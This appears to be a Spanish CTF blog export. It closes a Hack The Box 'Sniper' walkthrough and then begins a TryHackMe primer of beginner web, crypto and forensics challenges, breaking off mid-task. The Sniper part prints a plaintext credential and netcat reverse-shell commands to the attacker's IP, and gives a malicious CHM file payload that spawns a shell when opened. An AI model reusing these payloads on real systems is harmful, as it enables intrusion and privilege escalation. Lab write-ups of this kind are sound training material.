Sun Dec 31 17:57:56 1600\tPSHost.132237268742138566.1496.DefaultAppDomain.wsmprovhost fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tIISFCGI-3e6bfe08-4ed8-4e32-97ff-7c49438ccb63 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tIISFCGI-0587ff21-c423-47bb-872e-34f067d827a9 fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132237302290243128.4168.DefaultAppDomain.powershell fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132237304828945308.4400.DefaultAppDomain.powershell fr--r--r-- 1 Sun Dec 31 17:57:56 1600\tPSHost.132237305109360308.5580.DefaultAppDomain.wsmprovhost IPC$ READ ONLY\tRemote IPC Vemos que Chris tiene permisos de escritura y lectura en (.) la maquina. Intentamos utilizar smbclient y los modulos de metasploit para samba pero ninguno de ellos sirvio para obtener una shell. Por lo que utilizamos la misma tecnica que utilizamos con la maquina Arkham de HackTheBox en la que utilizamos las credenciales para obtener una sesion nueva utilizando powershell.\n1 2 3 4 $username =\u0026#34;Sniper\\Chris\u0026#34;; $password = convertto-securestring -AsPlainText -Force -String \u0026#34;36mEAhz/B8xQ~2VM\u0026#34;; $cred = New-Object System.Management.Automation.PSCredential -ArgumentList $username,$password; New-PSSession -Credential $cred | Enter-PSSession Al ejecutar estos comandos nos muestra una shell en localhost con el usuario Chris, pero, no podemos saltar hacia otras carpetas.\nPara obtener una shell con el usuario Chris utilizamos el mismo comando que utilizamos para obtener una shell con IUSR.\n1 \\\\10.10.15.244\\test\\nc.exe -e C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe 10.10.15.244 448 Obtenemos una shell y nuestra flag user.txt.\nPrivilege Escalation Malicious CHM file Enumeramos los directorios de Chris, vemos un archivo chm el cual se encuentra en C:\\Users\\Chris\\Downloads llamado instructions.chm.\nAl abrirlo en Windows nos muestra un mensaje.\nPff... This dumb CEO always makes me do all the shitty work. SMH!\rI\u0026#39;m never completing this thing. Gonna leave this place next week. Hope someone snipes him. De igual forma encontramos una nota en C:\\Docs y un PDF.\nphp for dummies-trial.pdf:\n1 2 3 4 5 6 note.txt: Hi Chris, Your php skillz suck. Contact yamitenshi so that he teaches you how to use it and after that fix the website as there are a lot of bugs on it. And I hope that you\u0026#39;ve prepared the documentation for our new app. Drop it here when you\u0026#39;re done with it. Regards, Sniper CEO. Vemos claramente en la nota que, Chris debe de reparar los bugs que existen en la pagina, luego de eso realizar la documentacion (instructions.chm al parecer) y dejarlos en la misma carpeta que la nota.\nCopiamos el archivo instructions.chm en C:\\Docs y despues de un tiempo el archivo desaparece, por lo que asumimos que es eliminado o revisado por el CEO (\u0026ldquo;Administrador\u0026rdquo;).\nCreamos un archivo CHM el cual contenga un comando para obtener una shell inversa, utilizamos \u0026ldquo;Microsoft HTML Help Workshop and Documentation\u0026rdquo; para generarlo.\nAgregamos al archivo principal nuestro siguiente payload entre la etiqueta BODY:\n1 2 3 4 5 6 7 8 9 \u0026lt;OBJECT id=x classid=\u0026#34;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11\u0026#34; width=1 height=1\u0026gt; \u0026lt;PARAM name=\u0026#34;Command\u0026#34; value=\u0026#34;ShortCut\u0026#34;\u0026gt; \u0026lt;PARAM name=\u0026#34;Button\u0026#34; value=\u0026#34;Bitmap::shortcut\u0026#34;\u0026gt; \u0026lt;PARAM name=\u0026#34;Item1\u0026#34; value=\u0026#39;,cmd.exe,/c C:\\Users\\Chris\\Documents\\nc.exe 10.10.15.244 449 -e C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\u0026#39;\u0026gt; \u0026lt;PARAM name=\u0026#34;Item2\u0026#34; value=\u0026#34;273,1,1\u0026#34;\u0026gt; \u0026lt;/OBJECT\u0026gt; \u0026lt;SCRIPT\u0026gt; x.Click(); \u0026lt;/SCRIPT\u0026gt; Trasladamos nuestro archivo a la carpeta C:\\Docs, netcat (nc.exe) y esperamos a que nuestro payload sea ejecutado:\nObtenemos nuestra shell con permisos de administrador y nuestra flag root.txt.\n","description":"Descubrimos una vulnerabilidad LFI/RFI en el blog donde ejecutamos una shell inversa utilizando una WebShell. Cambiamos al siguiente usuario utilizando PowerShell y credenciales almacenadas. Creando un archivo CHM y tras ser ejecutado escalamos privilegios.","id":150,"section":"posts","tags":["lfi","impacket","smbmap","chm"],"title":"Hack The Box - Sniper","uri":"https://sckull.github.io/posts/sniper/"},{"content":"\rStealthcopter CTF Primer es una serie de retos de TryHackMe donde utilizamos distintas herramientas para resolver los retos.\nRoom Titulo Stealthcopter ctf primer1 Descripción CTF primer containing 40 challenges (web, network, crypto and forensics) for beginnners Puntos * Dificultad Facil Maker stealthcopter WEB w.01 Revisa el codigo fuente de la pagina.\nw.02 Repara el nombre del script en la cabecera del archivo HTML y revisa la consola (developmer tools).\nw.03 Imagen base64 codificada.\nw.04 Elimina los // en el codigo fuente.\nw.05 Key bruteforce o adivina ;).\n1 2 3 4 5 sckull@uplifted:~/tmp/web$ php w.05.php \u0026#39;key=7\u0026#39; Key entered: 7 CipherText: T3FiSXVlOFYvVTJCRHRnRFdTRUZOeHplNVZpK0pQZUVUbWNmTHNCZUt5RT0= PlainText: FLAG{n0t_s0_t0ugh} sckull@uplifted:~/tmp/web$ w.06 Reto\n1 var _0x550c=[\u0026#39;HsOde8OyacKIw518XMKNPsO8SMO7w4JxwoPCugDCiwh4w43Cqw==\u0026#39;,\u0026#39;CcK3wq4=\u0026#39;];(function(_0x1421f9,_0xa7900b){var _0x371c54=function(_0x5f2f93){while(--_0x5f2f93){_0x1421f9[\u0026#39;push\u0026#39;](_0x1421f9[\u0026#39;shift\u0026#39;]());}};_0x371c54(++_0xa7900b);}(_0x550c,0x1e6));var _0x56ae=function(_0xec1512,_0x3f22ed){_0xec1512=_0xec1512-0x0;var _0x353971=_0x550c[_0xec1512];if(_0x56ae[\u0026#39;wlUhtf\u0026#39;]===undefined){(function(){var _0x353626=function(){var _0x1efe97;try{_0x1efe97=Function(\u0026#39;return\\x20(function()\\x20\u0026#39;+\u0026#39;{}.constructor(\\x22return\\x20this\\x22)(\\x20)\u0026#39;+\u0026#39;);\u0026#39;)();}catch(_0x299503){_0x1efe97=window;}return _0x1efe97;};var _0x53087e=_0x353626();var _0x4b80a9=\u0026#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\u0026#39;;_0x53087e[\u0026#39;atob\u0026#39;]||(_0x53087e[\u0026#39;atob\u0026#39;]=function(_0x8b960b){var _0x584879=String(_0x8b960b)[\u0026#39;replace\u0026#39;](/=+$/,\u0026#39;\u0026#39;);for(var _0x38ec89=0x0,_0xcfc329,_0xd90795,_0x409b70=0x0,_0x429a24=\u0026#39;\u0026#39;;_0xd90795=_0x584879[\u0026#39;charAt\u0026#39;](_0x409b70++);~_0xd90795\u0026amp;\u0026amp;(_0xcfc329=_0x38ec89%0x4?_0xcfc329*0x40+_0xd90795:_0xd90795,_0x38ec89++%0x4)?_0x429a24+=String[\u0026#39;fromCharCode\u0026#39;](0xff\u0026amp;_0xcfc329\u0026gt;\u0026gt;(-0x2*_0x38ec89\u0026amp;0x6)):0x0){_0xd90795=_0x4b80a9[\u0026#39;indexOf\u0026#39;](_0xd90795);}return _0x429a24;});}());var _0x4f002d=function(_0x5c44fa,_0x3f22ed){var _0x2dee1d=[],_0x17ee0=0x0,_0x4a4ac3,_0x41b3d2=\u0026#39;\u0026#39;,_0x329c74=\u0026#39;\u0026#39;;_0x5c44fa=atob(_0x5c44fa);for(var _0x2ee72b=0x0,_0x1f3f1d=_0x5c44fa[\u0026#39;length\u0026#39;];_0x2ee72b\u0026lt;_0x1f3f1d;_0x2ee72b++){_0x329c74+=\u0026#39;%\u0026#39;+(\u0026#39;00\u0026#39;+_0x5c44fa[\u0026#39;charCodeAt\u0026#39;](_0x2ee72b)[\u0026#39;toString\u0026#39;](0x10))[\u0026#39;slice\u0026#39;](-0x2);}_0x5c44fa=decodeURIComponent(_0x329c74);for(var _0xbc2d51=0x0;_0xbc2d51\u0026lt;0x100;_0xbc2d51++){_0x2dee1d[_0xbc2d51]=_0xbc2d51;}for(_0xbc2d51=0x0;_0xbc2d51\u0026lt;0x100;_0xbc2d51++){_0x17ee0=(_0x17ee0+_0x2dee1d[_0xbc2d51]+_0x3f22ed[\u0026#39;charCodeAt\u0026#39;](_0xbc2d51%_0x3f22ed[\u0026#39;length\u0026#39;]))%0x100;_0x4a4ac3=_0x2dee1d[_0xbc2d51];_0x2dee1d[_0xbc2d51]=_0x2dee1d[_0x17ee0];_0x2dee1d[_0x17ee0]=_0x4a4ac3;}_0xbc2d51=0x0;_0x17ee0=0x0;for(var _0x4301cb=0x0;_0x4301cb\u0026lt;_0x5c44fa[\u0026#39;length\u0026#39;];_0x4301cb++){_0xbc2d51=(_0xbc2d51+0x1)%0x100;_0x17ee0=(_0x17ee0+_0x2dee1d[_0xbc2d51])%0x100;_0x4a4ac3=_0x2dee1d[_0xbc2d51];_0x2dee1d[_0xbc2d51]=_0x2dee1d[_0x17ee0];_0x2dee1d[_0x17ee0]=_0x4a4ac3;_0x41b3d2+=String[\u0026#39;fromCharCode\u0026#39;](_0x5c44fa[\u0026#39;charCodeAt\u0026#39;](_0x4301cb)^_0x2dee1d[(_0x2dee1d[_0xbc2d51]+_0x2dee1d[_0x17ee0])%0x100]);}return _0x41b3d2;};_0x56ae[\u0026#39;ZUnPBK\u0026#39;]=_0x4f002d;_0x56ae[\u0026#39;ffVsLy\u0026#39;]={};_0x56ae[\u0026#39;wlUhtf\u0026#39;]=!![];}var _0x5e7cc1=_0x56ae[\u0026#39;ffVsLy\u0026#39;][_0xec1512];if(_0x5e7cc1===undefined){if(_0x56ae[\u0026#39;RhVTbi\u0026#39;]===undefined){_0x56ae[\u0026#39;RhVTbi\u0026#39;]=!![];}_0x353971=_0x56ae[\u0026#39;ZUnPBK\u0026#39;](_0x353971,_0x3f22ed);_0x56ae[\u0026#39;ffVsLy\u0026#39;][_0xec1512]=_0x353971;}else{_0x353971=_0x5e7cc1;}return _0x353971;};function callme(){var _0x4b81bb=_0x56ae(\u0026#39;0x0\u0026#39;,\u0026#39;E^eq\u0026#39;);console[_0x56ae(\u0026#39;0x1\u0026#39;,\u0026#39;X!jV\u0026#39;)](_0x4b81bb);} Ejecuta la funcion callme().\nw.07 Key bruteforce o adivina ;).\nsckull@uplifted:~/tmp/web$ php w.07.php \u0026#39;key=1337\u0026#39;\rKey entered: 1337\rCipherText: QXhUQzVLYjJkU2dZOEhkbHQ3dXZ4NndoWlh1Y0hyeUpsVEhVYTFxT3lWbz0=\rPlainText: sckull@uplifted:~/tmp/web$ php w.07.php \u0026#39;key=1338\u0026#39;\rKey entered: 1338\rCipherText: QXhUQzVLYjJkU2dZOEhkbHQ3dXZ4NndoWlh1Y0hyeUpsVEhVYTFxT3lWbz0=\rPlainText: FLAG{4_l1ttl3_b4t_h4rd3r} sckull@uplifted:~/tmp/web$ w.08 Reto\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTIzNCwidXNlcm5hbWUiOiJhZG1pbiIsInBhc3N3b3JkIjoiRkxBR3tqd3RfdDBrM25zX2FyM19jMDBsX2IzNG56fSJ9.gNVX4fCIMvjLYZ0jUY0untMYbPmRNNFzZwXyU01bv-M Json Web Token\nw.09 Reto\neyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTMzNywidXNlcm5hbWUiOiJhZG1pbiIsImhpbnQiOiJ0aGUgZmxhZyBpcyBGTEFHe3h4eHh4eHhfZDFjdDEwbjRyeV80dHQ0Y2t9IHdoZXJlIHh4eHh4eHggaXMgdGhlIHBhc3N3b3JkIHVzZWQgdG8gc2lnbiB0aGlzIHRva2VuIn0#756c17ca05dbc57b9ded6541055370059c145e3b31521c0c98df2b1674725601 Utilizamos hashcat\nsckull@uplifted:~/tmp/web$ /home/sckull/tools/hashcat/hashcat64.bin -m 16500 09web_jwt.txt /home/sckull/tools/rockyou.txt -o 09web_output.txt\rhashcat (v5.1.0) starting...\r* Device #1: WARNING! Kernel exec timeout is not disabled.\rThis may cause \u0026#34;CL_OUT_OF_RESOURCES\u0026#34; or related errors.\rTo disable the timeout, see: https://hashcat.net/q/timeoutpatch\rnvmlDeviceGetFanSpeed(): Not Supported\rOpenCL Platform #1: NVIDIA Corporation\r======================================\r* Device #1: GeForce MX130, 501/2004 MB allocatable, 3MCU\rHashes: 1 digests; 1 unique digests, 1 unique salts\rBitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates\rRules: 1\rApplicable optimizers:\r* Zero-Byte\r* Not-Iterated\r* Single-Hash\r* Single-Salt\rMinimum password length supported by kernel: 0\rMaximum password length supported by kernel: 256\rWatchdog: Temperature abort trigger set to 90c\rDictionary cache hit:\r* Filename..: /home/sckull/tools/rockyou.txt\r* Passwords.: 14344385\r* Bytes.....: 139921507\r* Keyspace..: 14344385\rSession..........: hashcat\rStatus...........: Cracked\rHash.Type........: JWT (JSON Web Token)\rHash.Target......: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTMzNy...nRyVgE\rTime.Started.....: Mon Mar 16 02:21:40 2020 (0 secs)\rTime.Estimated...: Mon Mar 16 02:21:40 2020 (0 secs)\rGuess.Base.......: File (/home/sckull/tools/rockyou.txt)\rGuess.Queue......: 1/1 (100.00%)\rSpeed.#1.........: 6400.2 kH/s (8.23ms) @ Accel:512 Loops:1 Thr:64 Vec:1\rRecovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts\rProgress.........: 98304/14344385 (0.69%)\rRejected.........: 0/98304 (0.00%)\rRestore.Point....: 0/14344385 (0.00%)\rRestore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1\rCandidates.#1....: 123456 -\u0026gt; Donovan\rHardware.Mon.#1..: Temp: 60c Util: 47% Core:1189MHz Mem:2505MHz Bus:4\rStarted: Mon Mar 16 02:21:29 2020\rStopped: Mon Mar 16 02:21:42 2020\rsckull@uplifted:~/tmp/web$ cat 09web_output.txt\reyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MTMzNywidXNlcm5hbWUiOiJhZG1pbiIsImhpbnQiOiJ0aGUgZmxhZyBpcyBGTEFHe3h4eHh4eHhfZDFjdDEwbjRyeV80dHQ0Y2t9IHdoZXJlIHh4eHh4eHggaXMgdGhlIHBhc3N3b3JkIHVzZWQgdG8gc2lnbiB0aGlzIHRva2VuIn0.dWwXygXbxXud7WVBBVNwBZwUXjsxUhwMmN8rFnRyVgE:rockyou\rsckull@uplifted:~/tmp/web$ w.10 La clave esta en el codigo fuente $key = hash( 'sha256', str(0x22C49FE9));\nsckull@uplifted:~/tmp/web$ python\rPython 2.7.17 (default, Nov 7 2019, 10:07:09) [GCC 7.4.0] on linux2\rType \u0026#34;help\u0026#34;, \u0026#34;copyright\u0026#34;, \u0026#34;credits\u0026#34; or \u0026#34;license\u0026#34; for more information.\r\u0026gt;\u0026gt;\u0026gt; print 0x22C49FE9\r583311337\r\u0026gt;\u0026gt;\u0026gt; sckull@uplifted:~/tmp/web$ php w.10.php \u0026#39;key=583311337\u0026#39;\rKey entered: 583311337\rCipherText: OWVzUHhVVFNsM0t6NFhDb1FiT0RJaHNrWWYrM3VRMi9FNXcyTGhxbVV0aHpKUjdOcGRVcWtZcWc3djV5OFVxQw==\rPlainText: FLAG{1_h0p3_y0u_d1dnt_brut3f0rc3_m3...LINE_16} sckull@uplifted:~/tmp/web$ Cryptography c.01 Reto:\nRkxBR3sxc3RfdGltZV9sdWNreX0= Base64\n1 2 3 4 5 sckull@uplifted:~/tmp/crypto$ cat c.01 RkxBR3sxc3RfdGltZV9sdWNreX0= sckull@uplifted:~/tmp/crypto$ cat c.01|base64 -d FLAG{1st_time_lucky} sckull@uplifted:~/tmp/crypto$ c.02 Reto:\nVW10NFFsSXpjM3BqYlZKbVpFZHNkRnBZVG1aWlZqbHFZVWRHZVdKWU1EMD0= Base64 X3\n1 https://gchq.github.io/CyberChef/#recipe=From_Base64(\u0026#39;A-Za-z0-9%2B/%3D\u0026#39;,true)From_Base64(\u0026#39;A-Za-z0-9%2B/%3D\u0026#39;,true)From_Base64(\u0026#39;A-Za-z0-9%2B/%3D\u0026#39;,true)\u0026amp;input=VlcxME5GRnNTWHBqTTNCcVlsWktiVnBGWkhOa1JuQlpWRzFhV2xacWJIRlpWV1JIWlZkS1dVMUVNRDA9 c.03 Reto:\nSYNT{fgnoorq_va_gur_onpx} ROT13\nhttps://gchq.github.io/CyberChef/#recipe=ROT13(true,true,13)\u0026amp;input=U1lOVHtmZ25vb3JxX3ZhX2d1cl9vbnB4fQ c.04 Reto:\nF5yd29CuXST7e5aMKaX4bnkV8xF8dKSMB7E14yWUU Base58\nhttps://gchq.github.io/CyberChef/#recipe=From_Base58(\u0026#39;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz\u0026#39;,false)\u0026amp;input=RjV5ZDI5Q3VYU1Q3ZTVhTUthWDRibmtWOHhGOGRLU01CN0UxNHlXVVU c.05 Reto:\n\\H\u0011WPG^DCXET\u0011EHAT\u0011^W\u0011T_RCHAEX^_\u0011XB\u0011I^CX_V;XE\u0016B\u0011EYT\u0011STBE;\u0012B^\u0011BTRDCT;;w}pvJI^CnXBnBDATCnBTRDCTL;w}pvJI^CnXBnBDATCnBTRDCTL;w}pvJI^CnXBnBDATCnBTRDCTL;w}pvJI^CnXBnBDATCnBTRDCTL;w}pvJI^CnXBnBDATCnBTRDCTL;w}pvJI^CnXBnBDATCnBTRDCTL;w}pvJI^CnXBnBDATCnBTRDCTL;w}pvJI^CnXBnBDATCnBTRDCTL;w}pvJI^CnXBnBDATCnBTRDCTL 1- XOR BruteForce (Key: 31)\n2- XOR\nhttps://gchq.github.io/CyberChef/#recipe=XOR_Brute_Force(1,100,0,\u0026#39;Standard\u0026#39;,false,true,false,\u0026#39;\u0026#39;/disabled)XOR(%7B\u0026#39;option\u0026#39;:\u0026#39;Hex\u0026#39;,\u0026#39;string\u0026#39;:\u0026#39;31\u0026#39;%7D,\u0026#39;Standard\u0026#39;,false)\u0026amp;input=XEgRV1BHXkRDWEVUEUVIQVQRXlcRVF9SQ0hBRVheXxFYQhFJXkNYX1Y7WEUWQhFFWVQRU1RCRTsSQl4RQlRSRENUOzt3fXB2SkleQ25YQm5CREFUQ25CVFJEQ1RMO3d9cHZKSV5DblhCbkJEQVRDbkJUUkRDVEw7d31wdkpJXkNuWEJuQkRBVENuQlRSRENUTDt3fXB2SkleQ25YQm5CREFUQ25CVFJEQ1RMO3d9cHZKSV5DblhCbkJEQVRDbkJUUkRDVEw7d31wdkpJXkNuWEJuQkRBVENuQlRSRENUTDt3fXB2SkleQ25YQm5CREFUQ25CVFJEQ1RMO3d9cHZKSV5DblhCbkJEQVRDbkJUUkRDVEw7d31wdkpJXkNuWEJuQkRBVENuQlRSRENUTA c.06 Reto:\nMlw Obkwgxvw vbtzxk mk t filahh gy xrukrtlbgk seilsuxxav mipm uc mlbry t lijbxw gy brlxkagoxr Utxwsk vmhaxvk, utwww hr lax pwmmijl hj s dxcohkh. Am xqhehck t ysjf hj hhecseilsuxxav lytlmmlnmmgg.\rYmjlm hwlvvauxh tr Zmgotr Ttmxalme Txepslh mf 1553, mai ubilwk bw wtlc lh nrvxkwltgh sgw meieiexgx, tnm ml kxwalmiv tep smmieimw lh uvwtd ml ngxae 1863, mljxx gwgmyjbxw dtmij. Mamk xtvfxw ml mai vxlgjbixahg pw vamxyki agwiuabjxktfdx (Yvwgvl xhk \u0026#39;xzx brvxvmhaxvsuei ubilwk\u0026#39;). Fefr iigiei ztoi lkbiv mh meieiexgx wgvvqimmgg lgzxfik mael tki wllifmbeder Zazxrwkx gaiaijl. Br 1863, Xkbivkbgz Dtwaldm otl xzx ymjlm xg infdbll s zxrwktp exmlgw hj vxvmhaxvagz Zazxrwkx gaiaijl.\rBr lax 19xz vxrlnkc lax wuaxqw ptw eblelmkmtnmiv mh Fdtbww wx Zazxrwkx (1523–1596), efw ls svjyakxh aml tjxlifm geex.\rRsmk ypsz bw txeso:\rYEEY{vasuheelx_xgdtbvw} Vigenere-cipher\nc.07 Reto:\n-----BEGIN RSA PRIVATE KEY-----\rMIIBOQIBAAJBALWyVLY0Yum5/589v9ECnrHDzDu1AyDP38Ajx6tcul9G2cFUFUMY\rIqf9Wm8BFxNxErdOWmhlJaw+q8rbaAyyRvUCAwEAAQJAWEYrodoRtDwJVPRLHOCI\r+RSHRPrMakSUEGVRvI9wfJi654A0HYLyk8JZnf+CbeueI7KnN/2w4MPIkxK9Mjfk\rgQIhAP878FR1Yo1X508REZ1YNVDKc6pl33Fm32LVSbz5s/RzAiEAtj3nQwJEgVG4\rBv2CIBZ1CRIGmILeZY3Cx54hGnB55PcCIGy/CgfCN+pHALvUZu/mTFkO2TdJzmkP\rzq/adl94+K53AiAZ5PHXM5tIRLRBSgQTSx2WDFmjkfTHuTzT4EQT3ad0QQIgUPy3\rp9QrcqBWnnHkTM+MjIjpRzQ2TMLx1e6dOxgYDl4=\r-----END RSA PRIVATE KEY----- openssl enc -in c.07.txt -out binarytext -d -a \u0026amp;\u0026amp; openssl rsautl -decrypt -in binarytext -out flag07.txt -inkey c.07.key \u0026amp;\u0026amp; cat flag07.txt\nc.08 Reto:\nhint: bacon\rloloooolooololoololoooollollololloooolooloolooolllooloooololololoooooooollooloooloooloooolooooooooloollololloooooooollooooollooloooollooolloloooloooooollooooollloloooloooooolooolll Bacon Cipher\nc.09 Reto:\nWOPM PM ZG ZDJOZEYWPR MXEMWPWXWPHG RPJOYL VOYLY YZRO DYWWYL PM LYJDZRYT VPWO ZGHWOYL. WOY ZDJOZEYW PM ZERTYUIOPQSDFGHJKLMWXCVBNA. NHXL UDZI PM UDZI{YZMN_ZM_ZER_123} 1- Monoalphabetic Substitution\n2- CyberChef - Monoalphabetic Substitution\nhttps://gchq.github.io/CyberChef/#recipe=Substitute(\u0026#39;PLAYFM\u0026#39;,\u0026#39;FLAGYB\u0026#39;)\u0026amp;input=VEhJUyBJUyBBTiBBTERIQU1FVElDIFNVTVNUSVRVVElPTiBDSURIRVIgV0hFUkUgRUFDSCBMRVRURVIgSVMgUkVETEFDRUcgV0lUSCBBTk9USEVSLiBUSEUgQUxESEFNRVQgSVMgQU1DR0VQWUhJVlpMS05PREpSU1RVQldRRlguIEZPVVIgUExBWSBJUyBQTEFZe0VBU0ZfQVNfQU1DXzEyM30 FLAG{easy_as_abc_123}\nc.10 Reto:\n333 555 2 4 7 777 33 2 66 3 777 666 444 3 2 66 3 444 666 7777 Multitap abc Cipher\nForensics f.01 1 2 3 sckull@uplifted:~/tmp/forensics$ cat f.01|grep FLAG FLAG{here_i_am} sckull@uplifted:~/tmp/forensics$ f.02.wav Morse - Decoder Audio\n1 FLAG{MORSE **** ***} f.03.jpg 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 sckull@uplifted:~/tmp/forensics$ exiftool f.03.jpg ExifTool Version Number : 10.80 File Name : f.03.jpg Directory : . File Size : 103 kB File Modification Date/Time : 2019:10:26 13:57:46-06:00 File Access Date/Time : 2019:10:26 13:57:46-06:00 File Inode Change Date/Time : 2020:03:10 18:52:40-06:00 File Permissions : rw-rw-r-- File Type : JPEG File Type Extension : jpg MIME Type : image/jpeg JFIF Version : 1.01 Exif Byte Order : Little-endian (Intel, II) X Resolution : 300 Y Resolution : 300 Resolution Unit : inches Software : GIMP 2.10.8 Modify Date : 2019:10:20 20:43:54 GPS Latitude : 0 deg 0\u0026#39; 0.00\u0026#34; GPS Longitude : 0 deg 0\u0026#39; 0.00\u0026#34; GPS Altitude : 0 m Compression : JPEG (old-style) Photometric Interpretation : YCbCr Samples Per Pixel : 3 Thumbnail Offset : 370 Thumbnail Length : 10424 XMP Toolkit : XMP Core 4.4.0-Exiv2 Digital Source Type : http://cv.iptc.org/newscodes/digitalsourcetype/digitalCapture Document ID : gimp:docid:gimp:718367af-6e16-4bd5-859e-7d934e66fc4e Instance ID : xmp.iid:4816adee-26e4-489c-9d9f-125d04d23c3b Original Document ID : xmp.did:8ea562a1-efa5-4766-b216-6fd07e106c76 Model Release Status : None Api : 2.0 Platform : Linux Time Stamp : 1571600638600225 Version : 2.10.8 Format : image/jpeg Creator Tool : GIMP 2.10 Location Created : Location Shown : Artwork Or Object : Registry ID : History Action : saved, saved History Changed : /metadata, / History Instance ID : xmp.iid:aad9dc17-4a47-49b9-a57f-540623e0091d, xmp.iid:d8a72d8c-5fd0-43b7-a097-16b682f31893 History Software Agent : Gimp 2.10 (Linux), Gimp 2.10 (Linux) History When : +01:00, +01:00 Image Supplier : Image Creator : Copyright Owner : Licensor : Creator : type=\u0026#34;Seq\u0026#34; FLAG{**********} Image Width : 800 Image Height : 600 Encoding Process : Progressive DCT, Huffman coding Bits Per Sample : 8 Color Components : 3 Y Cb Cr Sub Sampling : YCbCr4:4:4 (1 1) Image Size : 800x600 Megapixels : 0.480 Thumbnail Image : (Binary data 10424 bytes, use -b option to extract) GPS Position : 0 deg 0\u0026#39; 0.00\u0026#34;, 0 deg 0\u0026#39; 0.00\u0026#34; sckull@uplifted:~/tmp/forensics$ f.04 1 2 3 4 5 sckull@uplifted:~/tmp/forensics$ file _f.04 _f.04: ASCII text sckull@uplifted:~/tmp/forensics$ cat _f.04 FLAG{*******_****_engaged} sckull@uplifted:~/tmp/forensics$ f.05.png 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 sckull@uplifted:~/tmp/forensics$ binwalk f.05.png DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 1406 x 800, 8-bit/color RGB, non-interlaced 99 0x63 Zlib compressed data, default compression 2093725 0x1FF29D Zip archive data, at least v2.0 to extract, compressed size: 44, uncompressed size: 400, name: flag.txt 2093913 0x1FF359 End of Zip archive sckull@uplifted:~/tmp/forensics$ binwalk -e f.05.png DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 1406 x 800, 8-bit/color RGB, non-interlaced 99 0x63 Zlib compressed data, default compression 2093725 0x1FF29D Zip archive data, at least v2.0 to extract, compressed size: 44, uncompressed size: 400, name: flag.txt 2093913 0x1FF359 End of Zip archive sckull@uplifted:~/tmp/forensics$ cd _f.05.png.extracted/ sckull@uplifted:~/tmp/forensics/_f.05.png.extracted$ ls 1FF29D.zip 63\t63.zlib flag.txt sckull@uplifted:~/tmp/forensics/_f.05.png.extracted$ cat flag.txt flag{this_is_another_one_of_them_flags} flag{this_is_another_one_of_them_flags} flag{this_is_another_one_of_them_flags} flag{this_is_another_one_of_them_flags} flag{this_is_another_one_of_them_flags} flag{this_is_another_one_of_them_flags} flag{this_is_another_one_of_them_flags} flag{this_is_another_one_of_them_flags} flag{this_is_another_one_of_them_flags} flag{this_is_another_one_of_them_flags} sckull@uplifted:~/tmp/forensics/_f.05.png.extracted$ f.06.png 1 2 3 4 5 6 7 8 9 10 11 12 13 sckull@uplifted:~/tmp/forensics$ xxd f.06.png |head 00000000: 8950 4e58 0d0a 1a0a 0000 000d 4948 4452 .PNX........IHDR 00000010: 0000 0640 0000 0429 0806 0000 0099 68c1 ...@...)......h. 00000020: 1c00 002d c07a 5458 7452 6177 2070 726f ...-.zTXtRaw pro 00000030: 6669 6c65 2074 7970 6520 6578 6966 0000 file type exif.. 00000040: 78da ad9c 6992 2d37 8ea5 ff73 15b9 04ce x...i.-7...s.... 00000050: c372 4090 34eb 1dd4 f2eb 3b1e 21a9 a4ac .r@.4.....;.!... 00000060: 2ab3 6e6b 3d65 46e8 be3b b813 c019 40f0 *.nk=eF..;....@. 00000070: 86fb 1fff e785 7ffd eb5f 29e6 1443 6d63 ........._)..Cmc 00000080: f6d5 7be4 9fba eaca c62f 33fe fcf3 f333 ..{....../3....3 00000090: c5fa fdff f70f bff6 df47 fff6 78c8 ebfb .........G..x... sckull@uplifted:~/tmp/forensics$ sckull@uplifted:~/tmp/forensics$ xxd -p f.06.png \u0026gt; hex_png06 BAD HEADER FILE MAGIC NUMBERS\nList of File Signatures\n1 2 89 50 4E 47 0D 0A 1A 0A FLAG{n0_m0r3_c0rrupt10n} f.07.zip 1 2 3 4 5 6 7 8 9 10 sckull@uplifted:~/tmp/forensics$ fcrackzip -D -u -p /home/sckull/tools/rockyou.txt f.07.zip PASSWORD FOUND!!!!: pw == password1 sckull@uplifted:~/tmp/forensics$ sckull@uplifted:~/tmp/forensics$ unzip f.07.zip Archive: f.07.zip [f.07.zip] flag.txt password: inflating: flag.txt sckull@uplifted:~/tmp/forensics$ cat flag.txt FLAG{zippy_zip_zip_zip} sckull@uplifted:~/tmp/forensics$ f.08 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 sckull@uplifted:~/tmp/forensics$ file f.08 f.08: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, BuildID[sha1]=ea2b43595682667af187b0ac8db31207e9bf845f, for GNU/Linux 3.2.0, not stripped sckull@uplifted:~/tmp/forensics$ chmod +x f.08 sckull@uplifted:~/tmp/forensics$ ./f.08 Hello, please enter the flag: hello Sorry the flag is incorrect 